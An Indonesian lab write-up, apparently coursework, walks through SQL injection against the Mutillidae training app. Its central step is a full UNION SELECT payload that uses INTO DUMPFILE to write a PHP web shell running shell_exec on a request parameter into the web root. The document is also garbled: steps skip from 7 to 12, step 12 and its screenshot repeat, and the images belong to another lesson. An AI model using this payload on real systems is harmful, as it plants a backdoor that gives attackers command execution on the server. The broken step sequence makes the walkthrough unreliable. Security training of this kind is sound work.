1. Melihat database pada mutillidae. 
  
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/Lesson_10/show%20database%20dan%20use%20owasp10.PNG "DATABASES PADA MUTILLIDAE")
  
   2. Melihat tabel database owasp10
    
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/Lesson_10/show%20tables%20owasp10.PNG "TABEL PADA OWASP10")
  
   3. Melihat field pada tabel account
    
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/Lesson_10/desc%20accounts.PNG "FIELD TABEL ACCOUNT")
  
   4. Buka mutillidae pada browser
   5. Menuju menu user info. OWASP Top 10 --> A1 - SQL Injection --> SQLi - Extract Data --> User Info
   6. Inspect elemen pada textbox name, lalu ubah size.
    
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/Lesson_10/inspect%20elemet%20100.PNG "INSPECT ELEMEN dan UBAH SIZE")
  
   7. Melakukan Backdoor Union SQL Union Injection. Dengan perintah " ' union select null,null,null,null,'<form action="" method="post" enctype="application/x-www-form-urlencoded"><input type="text" name="CMD" size="50"><input type="submit" value="Execute Command" /></form><?php echo "<pre>";echo shell_exec($_REQUEST["CMD"]);echo "</pre>"; ?>' INTO DUMPFILE '/var/www/html/mutillidae/execute_command.php' --  "
   
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/LESSON_7/hasil%20run%20perl%20script.PNG "HASIL SQL INJECTION DENGAN PERL")
  
   12. Jalankan script perl dengan perintah ./lesson7.pl
   
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/LESSON_7/hasil%20run%20perl%20script.PNG "HASIL SQL INJECTION DENGAN PERL")
  
   12. Jalankan script perl dengan perintah ./lesson7.pl
   
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/LESSON_7/hasil%20run%20perl%20script.PNG "HASIL SQL INJECTION DENGAN PERL")
  
